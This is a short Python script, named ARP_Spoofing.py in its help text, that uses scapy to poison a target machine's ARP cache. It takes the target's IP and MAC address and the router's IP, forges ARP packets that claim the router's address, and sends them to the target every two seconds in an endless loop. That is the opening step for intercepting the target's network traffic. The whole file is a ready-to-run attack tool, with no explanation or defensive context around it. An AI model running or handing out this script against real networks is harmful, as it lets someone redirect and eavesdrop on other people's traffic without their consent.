from operator import imod
from scapy.all import *
from subprocess import call
from scapy.layers.l2 import Ether, ARP
import argparse
import time

op = 1
arg_parser = argparse.ArgumentParser(description='python3 ARP_Spoofing.py [target ip] [target MAC] [router ip]')
arg_parser.add_argument('tip', help="input target ip address")
arg_parser.add_argument('tmac', help="input target mac address")
arg_parser.add_argument('rip', help="input router ip address")


arg = arg_parser.parse_args()

target_ip = arg.tip
target_MAC = arg.tmac
router_ip = arg.rip

arp = ARP(op=op, psrc=router_ip, pdst= target_ip, hwdst=target_MAC)

while 1:
    send(arp)
    time.sleep(2)
